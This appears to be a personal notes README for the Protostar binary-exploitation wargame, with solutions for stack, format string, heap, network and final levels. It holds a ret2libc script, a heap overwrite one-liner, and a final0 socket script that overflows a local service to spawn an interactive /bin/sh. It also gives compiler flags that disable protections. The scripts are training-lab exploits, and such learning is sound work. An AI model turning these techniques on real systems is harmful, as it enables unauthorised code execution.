# Protostar

## Stack
- [x] stack0
- [x] stack1
- [x] stack2
- [x] stack3
- [x] stack4
- [x] stack5
- [x] stack6
- [x] stack7
```
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
return_op = struct.pack("I",0x08048544)
call_system = struct.pack("I",0xb7ecffb0)
after_system_execution = struct.pack("I",0xb7ec60c0)
bin_sh_path = struct.pack("I",0xb7fb63bf)
print padding + return_op + call_system + after_system_execution + bin_sh_path
```

## Format String
- [x] format0
- [x] format1
- [x] format2
```
%n4u (replace 4 with additional data you want for %n )
```
- [x] format3
- [x] format4

## Heap
- [x] heap0
- [x] heap1
```
./heap1 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"`" "`/bin/echo -ne "\x94\x84\x04\x08"`"
```
- [x] heap2
```
exploiting use-after-free bug
```
- [x] heap3
```
need to create a fake chunk and unlink it explictly
then forward & backward pointer is abused to write change the PLT

hence executing the winner function
```

## Network

- [x] net0
```
echo -ne "`cat -`" | nc 127.0.0.1 2999

to enter the little endian string
```
- [x] net1
- [x] net2

## Final
- [x] final0
```
import struct
import socket
import telnetlib

HOST='127.0.0.1'
PORT=2995

padding = "A"*500+"\x00"+"aaaabbbbccccddddeeeeffffgggghhh"
execv = struct.pack("I",0x08048c0c)
execv_ret = "AAAA"
execv_param =  struct.pack("I",1176511+0xb7e97000)#bin/sh address

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))


exploit = padding+execv+execv_ret+execv_param+"\x00"*8

s.send(exploit+"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
```
- [ ] final1
- [ ] final2

## Create a Binary with no stack canary, executable stack and no PIE (Position Independent Code)
```
gcc <input> -o <output> -fno-stack-protector -z execstack -no-pie
```

## Using socat on binary file
attaching binary to the port
```
socat TCP-LISTEN:1337,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./<Program name>"
```

# Reference
- https://old.liveoverflow.com/binary_hacking/protostar/index.html
- https://exploit.education/protostar/
- https://ctf101.org/binary-exploitation/overview/

# Writeup & Video
- https://kevinalmansa.github.io/write-ups/Protostar-Stack-Write-up/
- https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
- https://failingsilently.wordpress.com/exploit-development/
- https://www.ayrx.me/protostar-walkthrough-format ( format string writeup )

# Tools
- https://github.com/inaz2/roputils
- https://github.com/JonathanSalwan/ROPgadget
